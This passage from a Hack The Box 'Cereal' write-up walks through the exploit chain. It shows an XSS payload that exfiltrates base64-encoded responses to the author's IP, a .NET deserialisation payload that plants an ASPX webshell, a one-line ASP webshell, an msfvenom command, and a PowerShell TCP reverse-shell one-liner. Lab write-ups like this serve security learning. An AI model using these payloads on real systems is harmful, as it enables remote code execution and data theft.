js_string = 'var myHeaders = new Headers(); myHeaders.append(\'Authorization\', \'Bearer ' + token + '\');var myInit = {method: \'GET\', headers: myHeaders};fetch("requests/' + target_id + '", myInit).then(function(response) {var resp = btoa(response.text());const image = document.createElement("img");image.src = "http://' + ip + '/".concat(resp);document.querySelector("div[className=\'card card-body bg-light\']").appendChild(image);});'
```

THIS TIME WE GOT A RESPONSE:

```bash
10.10.10.217 - - [16/Apr/2021 21:33:30] "GET /W29iamVjdCBQcm9taXNlXQ== HTTP/1.1" 404 -
```

This decodes to `[object Promise]`, which is obviously not that helpful. I edited my code to return `response.text().body()`, as per the docs. However this crashed. I instead used this structure:

```python
js_string = 'var myHeaders = new Headers(); myHeaders.append(\'Authorization\', \'Bearer ' + token + '\');var myInit = {method: \'GET\', headers: myHeaders}; fetch("requests/' + target_id + '", myInit).then(response => response.text()).then((body) => {var resp = btoa(body);const image = document.createElement("img");image.src = "http://' + ip + '/".concat(resp);document.querySelector("div[className=\'card card-body bg-light\']").appendChild(image);});'
```

This body object returns a large amount of base64, but it doesn't decode nicely:

```bash
10.10.10.217 - - [16/Apr/2021 22:28:03] "GET /PCFkb2...[snip]...odG1sPg== HTTP/1.1" 404 -
```

Using `response.json()` also returns an interesting result:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/cereal]
└─$ echo 'PCFkb2...[snip]...odG1sPg==' | base64 -d
<!doctype html><html lang="en"><head><meta charset="UTF-8"><title>Cereal</title><link href="//netdna.bootstrapcdn.com/bootstrap/4.1.1/css/bootstrap.min.css" rel="stylesheet"/><style>a{cursor:pointer}</style><link href="/static/css/main.36497136.chunk.css" rel="stylesheet"></head><body><div id="app"></div><script>!function(f){function e(e){for(var r,t,n=e[0],o=e[1],u=e[2],l=0,a=[];l<n.length;l++)t=n[l],Object.prototype.hasOwnProperty.call(c,t)&&c[t]&&a.push(c[t][0]),c[t]=0;for(r in o)Object.prototype.hasOwnProperty.call(o,r)&&(f[r]=o[r]);for(s&&s(e);a.length;)a.shift()();return p.push.apply(p,u||[]),i()}function i(){for(var e,r=0;r<p.length;r++){for(var t=p[r],n=!0,o=1;o<t.length;o++){var u=t[o];0!==c[u]&&(n=!1)}n&&(p.splice(r--,1),e=l(l.s=t[0]))}return e}var t={},c={1:0},p=[];function l(e){if(t[e])return t[e].exports;var r=t[e]={i:e,l:!1,exports:{}};return f[e].call(r.exports,r,r.exports,l),r.l=!0,r.exports}l.m=f,l.c=t,l.d=function(e,r,t){l.o(e,r)||Object.defineProperty(e,r,{enumerable:!0,get:t})},l.r=function(e){"undefined"!=typeof Symbol&&Symbol.toStringTag&&Object.defineProperty(e,Symbol.toStringTag,{value:"Module"}),Object.defineProperty(e,"__esModule",{value:!0})},l.t=function(r,e){if(1&e&&(r=l(r)),8&e)return r;if(4&e&&"object"==typeof r&&r&&r.__esModule)return r;var t=Object.create(null);if(l.r(t),Object.defineProperty(t,"default",{enumerable:!0,value:r}),2&e&&"string"!=typeof r)for(var n in r)l.d(t,n,function(e){return r[e]}.bind(null,n));return t},l.n=function(e){var r=e&&e.__esModule?function(){return e.default}:function(){return e};return l.d(r,"a",r),r},l.o=function(e,r){return Object.prototype.hasOwnProperty.call(e,r)},l.p="/";var r=this.webpackJsonpcereal=this.webpackJsonpcereal||[],n=r.push.bind(r);r.push=e,r=r.slice();for(var o=0;o<r.length;o++)e(r[o]);var s=n;i()}([])</script><script src="/static/js/2.b1f1328d.chunk.js"></script><script src="/static/js/main.be77be84.chunk.js"></script></body></html>
```

This wasn't what I was expecting - it looks to be a HTML page, and I was expecting some sort of error message. This suggests that maybe the request is actually successful, and there is something up with my deserialisation payload.

#### ASP Payload

I couldn't see an obvious issue with it, so thought that maybe I need to actually make a `test.txt` file to be downloaded. Rather than this, I decided to go straight for a shell. As this is a Windows box running `.NET`, I thought an `asp` shell would be appropriate. I found this one at the following page: [https://blog.atucom.net/2015/07/one-line-asp-shell.html](https://blog.atucom.net/2015/07/one-line-asp-shell.html)

```asp
<%response.write CreateObject("WScript.Shell").Exec(Request.QueryString("cmd")).StdOut.Readall()%>
```

I modified my deserialisation payload to request this file from my box. I also considered including the status code of the response in my callback, but couldn't find an immediate way to do it, so skipped this for now.

#### Getting a Nice Response

I noticed a small mistake in my script, where I was not wrapping the download URL in quotes.

```bash
Creating target cereal, which will download from URL http://10.10.14.92/shell.asp when deserialised
JSON submitted: {"JSON":"{\"$type\":\"Cereal.DownloadHelper, Cereal\",\"URL\": http://10.10.14.92/shell.asp,\"FilePath\":\"shell.asp\"}"}
```

This could potentially be my issue. I let the first attempt run before changing it. I got a callback, but no attempt to download my file. The response base64 was also badly formatted again.

So I fixed the bug in my code and tried again:

```bash
Creating target cereal, which will download from URL http://10.10.14.92/shell.asp when deserialised
JSON submitted: {"JSON":"{\"$type\":\"Cereal.DownloadHelper, Cereal\",\"URL\": \"http://10.10.14.92/shell.asp\",\"FilePath\":\"shell.asp\"}"}
```

This time I got a much nicer response:

```bash
10.10.10.217 - - [18/Apr/2021 13:14:09] "GET /Q2VyZWFsLkRvd25sb2FkSGVscGVy HTTP/1.1" 404 -
```

Which decodes to:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/cereal/test-www]
└─$ echo 'Q2VyZWFsLkRvd25sb2FkSGVscGVy' | base64 -d
Cereal.DownloadHelper
```

I also ran a payload that checks the HTTP status, and it came back fine:

```javascript
fetch("https://cereal.htb/requests/' + target_id + '", myInit).then(function(response) {var resp = btoa(response.status).concat(btoa(response.json()));
```

Returning a 200 status code:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/cereal/test-www]
└─$ echo 'MjAwW29iamVjdCBQcm9taXNlXQ==' | base64 -d
200[object Promise]
```

This is promising! Although a request for our `shell.asp` didn't appear in our Python Server, let's see if the file is on the system.

#### Testing for the Shell

Hitting the file in the browser at `https://10.10.10.217/shell.asp` didn't give a 404. I also tried hitting it with `curl`, using the `-k` option to ignore the broken SSL certificate:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/cereal/test-www]
└─$ curl -k https://10.10.10.217/shell.asp?cmd=ipconfig
<!doctype html><html lang="en"><head><meta charset="UTF-8"><title>Cereal</title><link href="//netdna.bootstrapcdn.com/bootstrap/4.1.1/css/bootstrap.min.css" rel="stylesheet"/><style>a{cursor:pointer}</style><link href="/static/css/main.36497136.chunk.css" rel="stylesheet"></head><body><div id="app"></div><script>!function(f){function e(e){for(var r,t,n=e[0],o=e[1],u=e[2],l=0,a=[];l<n.length;l++)t=n[l],Object.prototype.hasOwnProperty.call(c,t)&&c[t]&&a.push(c[t][0]),c[t]=0;for(r in o)Object.prototype.hasOwnProperty.call(o,r)&&(f[r]=o[r]);for(s&&s(e);a.length;)a.shift()();return p.push.apply(p,u||[]),i()}function i(){for(var e,r=0;r<p.length;r++){for(var t=p[r],n=!0,o=1;o<t.length;o++){var u=t[o];0!==c[u]&&(n=!1)}n&&(p.splice(r--,1),e=l(l.s=t[0]))}return e}var t={},c={1:0},p=[];function l(e){if(t[e])return t[e].exports;var r=t[e]={i:e,l:!1,exports:{}};return f[e].call(r.exports,r,r.exports,l),r.l=!0,r.exports}l.m=f,l.c=t,l.d=function(e,r,t){l.o(e,r)||Object.defineProperty(e,r,{enumerable:!0,get:t})},l.r=function(e){"undefined"!=typeof Symbol&&Symbol.toStringTag&&Object.defineProperty(e,Symbol.toStringTag,{value:"Module"}),Object.defineProperty(e,"__esModule",{value:!0})},l.t=function(r,e){if(1&e&&(r=l(r)),8&e)return r;if(4&e&&"object"==typeof r&&r&&r.__esModule)return r;var t=Object.create(null);if(l.r(t),Object.defineProperty(t,"default",{enumerable:!0,value:r}),2&e&&"string"!=typeof r)for(var n in r)l.d(t,n,function(e){return r[e]}.bind(null,n));return t},l.n=function(e){var r=e&&e.__esModule?function(){return e.default}:function(){return e};return l.d(r,"a",r),r},l.o=function(e,r){return Object.prototype.hasOwnProperty.call(e,r)},l.p="/";var r=this.webpackJsonpcereal=this.webpackJsonpcereal||[],n=r.push.bind(r);r.push=e,r=r.slice();for(var o=0;o<r.length;o++)e(r[o]);var s=n;i()}([])</script><script src="/static/js/2.b1f1328d.chunk.js"></script><script src="/static/js/main.be77be84.chunk.js"></script></body></html>
```

This is a similar response to before. There is no evidence of the `ipconfig` command being run. Let's see if we can ping our own box.

I setup a `tcpdump` to listen for ICMP (ping) requests:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/cereal/test-www]
└─$ sudo tcpdump -i tun0 -n icmp
[sudo] password for mac: 
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
```

Then I used the `ping -n 1` command to ping my box once (equivalent to `ping -c 1` on linux).

```
https://10.10.10.217/shell.asp?cmd=ping%20-n%201%2010.10.14.92
```

I got nothing back.

At this point I wasn't sure if my download helper was broken or if my shell was broken. I checked a random non-existent URL in `curl` and got the same response back, suggesting that my Download Helper wasn't grabbing the file from the box.

The response suggests that it is being successfully deserialised and returning `Ok(cereal.ToString());`. However I am not getting a hit.

I tried HTTPS:

```
"JSON":"{\"$type\":\"Cereal.DownloadHelper, Cereal\",\"URL\": \"https://10.10.14.92/shell.asp\",\"FilePath\":\"shell.asp\"}"}
```

I was advised that it should work over HTTP. I even tried hosting a second python server on port 8000 and hitting that instead, but no luck.

#### Adjusting the Filepath (Final Payload!)

I thought back to before and my assumption about the Download Utility using relative paths. Perhaps the download request only works if there is a valid filepath on the other end. I was advised to think about somewhere I know I can access that can run `asp` files. I thought about potentially `ClientApp/public`, and then it clicked. The `source.cereal.htb` domain had a filepath disclosure on an errored asp file!

![](/assets/images/blogs/Pasted image 20210418150714.png)

So I decided to use `msfvenom` to generate a full reverse shell in `aspx`, rather than a simple one-liner. I found a command on [hacktricks](https://book.hacktricks.xyz/shells/shells/untitled#asp-x) for generating this:

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.92 LPORT=9001 -f aspx >reverse.aspx
```

And sent my payload to this path:

```python
target_json_string = "{\"json\":\"{\\\"$type\\\":\\\"Cereal.DownloadHelper, Cereal\\\",\\\"URL\\\":\\\"" + download_url +  "\\\",\\\"FilePath\\\":\\\"c:\inetpub\source\uploads\oops.aspx\\\"}\"}"
```

I started a netcat listener on 9001:

```bash
$ nc -lnvp 9001
```

I corrected the escaping for the filepath, and sent my payload for hopefully the last time.

```python
download_url = "http://{}:8001/reverse.aspx".format(ip)
    print("Creating target cereal, which will download from URL {} when deserialised".format(download_url))

    target_json_string = "{\"json\":\"{\\\"$type\\\":\\\"Cereal.DownloadHelper, Cereal\\\",\\\"URL\\\":\\\"" + download_url +  "\\\",\\\"FilePath\\\":\\\"c:\\\\inetpub\\\\source\\\\uploads\\\\oops.aspx\\\"}\"}"
```

I got the same HTML response as before, when I was missing quotes. I figured this must be to do with the format of my JSON:

```
{"json":"{\"$type\":\"Cereal.DownloadHelper, Cereal\",\"URL\":\"http://10.10.14.92:8001/reverse.aspx\",\"FilePath\":\"c:\\inetpub\\source\\uploads\\oops.aspx\"}"}
```

I was pretty sure the double backslash is necessary. However, just out of sheer desperation I tried a forward slash instead:

```python
target_json_string = "{\"json\":\"{\\\"$type\\\":\\\"Cereal.DownloadHelper, Cereal\\\",\\\"URL\\\":\\\"" + download_url +  "\\\",\\\"FilePath\\\":\\\"c:/inetpub/source/uploads/oops.aspx\\\"}\"}"
```

AND I GOT A HIT:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/cereal/test-www]
└─$ python3 -m http.server 8001
Serving HTTP on 0.0.0.0 port 8001 (http://0.0.0.0:8001/) ...
10.10.10.217 - - [18/Apr/2021 16:59:33] "GET /reverse.aspx HTTP/1.1" 200 -
```

Visiting `source.cereal.htb/uploads/oops.aspx` didn't hit my netcat listener. I assumed this was an issue with the meterpreter payload, so I switched to one of Kali's preinstalled shells, as listed by [High on Coffee](https://highon.coffee/blog/reverse-shell-cheat-sheet/#kali-aspx-shells)

```bash
┌──(mac㉿kali)-[~/Documents/HTB/cereal/test-www]
└─$ cp /usr/share/webshells/aspx/cmdasp.aspx  .
```

AND IT WORKED

![](/assets/images/blogs/Pasted image 20210418171925.png)

Now I have RCE, I need a better shell - it's powershell time.

But before we do that, let's reap the rewards of our hard work and grab the user flag :)

![](/assets/images/blogs/Pasted image 20210418173850.png)

## Summary of Working Commands

The final deserialisation payload:

```python
deserialisation_cereal = {\"json\":\"{\\\"$type\\\":\\\"Cereal.DownloadHelper, Cereal\\\",\\\"URL\\\":\\\"" + download_url +  "\\\",\\\"FilePath\\\":\\\"c:/inetpub/source/uploads/oops.aspx\\\"}\"}
```

The final XSS payload:

```python
xss_cer = "{\"JSON\":\"{\\\"title\\\":\\\"[XSS](javascript: eval(atob(%22" + b64_js.decode('utf-8') + "%22%29%29)\\\",\\\"flavor\\\":\\\"f\\\",\\\"color\\\":\\\"#FFF\\\",\\\"description\\\":\\\"d\\\"}\"}"
```

Of course, you can see all of this in [the script](https://github.com/Twigonometry/CTF-Tools/blob/master/hack_the_box/cereal/cereal-chain.py).

# Shell as sonny

I wanted to get a proper shell with powershell. I found a few examples:
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#powershell](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#powershell)
- [https://gist.github.com/egre55/c058744a4240af6515eb32b2d33fbed3](https://gist.github.com/egre55/c058744a4240af6515eb32b2d33fbed3)
- [https://gist.githubusercontent.com/staaldraad/204928a6004e89553a8d3db0ce527fd5/raw/fe5f74ecfae7ec0f2d50895ecf9ab9dafe253ad4/mini-reverse.ps1](https://gist.githubusercontent.com/staaldraad/204928a6004e89553a8d3db0ce527fd5/raw/fe5f74ecfae7ec0f2d50895ecf9ab9dafe253ad4/mini-reverse.ps1)

In the end I went for this one, from [https://hackersinterview.com/oscp/reverse-shell-one-liners-oscp-cheatsheet/](https://hackersinterview.com/oscp/reverse-shell-one-liners-oscp-cheatsheet/):

```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.92',9001);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

I pasted this into my shell at `http://source.cereal.htb/uploads/oops.aspx`, and got a hit!

```bash
┌──(mac㉿kali)-[~/Documents/HTB/cereal/test-www]
└─$ nc -lnvp 9001
listening on [any] 9001 ...
connect to [10.10.14.92] from (UNKNOWN) [10.10.10.217] 55785
whoami
cereal\sonny
PS C:\windows\system32\inetsrv> 
```

## Conclusion

I'm going to leave it there with this one. Getting a proper shell was pretty much as far as I got - I did a little bit of Windows enumeration, but nothing worth writing up.

I may return to this box one day - but for now I'm just proud of myself for figuring this out with relatively few hints (and a lot of late nights). Thank you Hack the Box!